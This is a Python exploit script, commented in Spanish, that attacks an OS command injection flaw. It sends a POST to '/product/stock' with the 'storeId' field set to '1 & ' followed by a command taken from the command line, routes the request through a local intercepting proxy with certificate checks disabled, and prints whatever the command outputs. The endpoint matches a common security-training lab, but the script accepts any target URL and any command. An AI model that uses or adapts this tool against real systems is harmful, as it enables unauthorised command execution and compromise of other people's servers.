# Importamos las bibliotecas necesarias
import requests  # Importa la biblioteca 'requests' para realizar solicitudes HTTP.
import sys  # Importa la biblioteca 'sys' para trabajar con argumentos de línea de comandos.
import urllib3  # Importa la biblioteca 'urllib3' para deshabilitar advertencias de seguridad en solicitudes HTTP.

# Deshabilitamos las advertencias de seguridad relacionadas con solicitudes HTTP no seguras.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Definimos un diccionario 'proxies' que se utilizará para enrutar tráfico a través de un proxy local.
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Definimos una función llamada 'run_command' que toma una URL y un comando como parámetros.
def run_command(url, command):
    # Definimos la ruta de la URL a la que enviaremos la solicitud HTTP.
    stock_path = '/product/stock'
    
    # Construimos la inyección de comando al concatenar '1 &' con el comando proporcionado.
    command_injection = '1 & ' + command
    
    # Definimos los parámetros que se enviarán en la solicitud POST.
    params = {'productId': '1', 'storeId': command_injection}
    
    # Realizamos una solicitud POST a la URL con los parámetros definidos, ignorando la verificación SSL
    # y utilizando el proxy definido anteriormente.
    r = requests.post(url + stock_path, data=params, verify=False, proxies=proxies)
    
    # Comprobamos la longitud de la respuesta recibida para determinar si la inyección de comando fue exitosa.
    if (len(r.text) > 3):
        print("(+) Inyección de comando exitosa!")
        print("(+) Salida del comando: " + r.text)
    else:
        print("(-) Inyección de comando fallida.")

# Definimos la función principal 'main'.
def main():
    # Verificamos si se proporcionan los argumentos necesarios (URL y comando).
    if len(sys.argv) != 3:
        print("(+) Uso: %s <url> <comando>" % sys.argv[0])
        print("(+) Ejemplo: %s www.ejemplo.com whoami" % sys.argv[0])
        sys.exit(-1)

    # Obtenemos la URL y el comando de los argumentos de línea de comandos.
    url = sys.argv[1]
    command = sys.argv[2]
    
    # Informamos que estamos explotando una inyección de comando y llamamos a la función 'run_command'.
    print("(+) Explotando la inyección de comando...")
    run_command(url, command)

# Verificamos si el script se está ejecutando como programa principal.
if __name__ == "__main__":
    main()  # Llamamos a la función principal 'main' si es así.
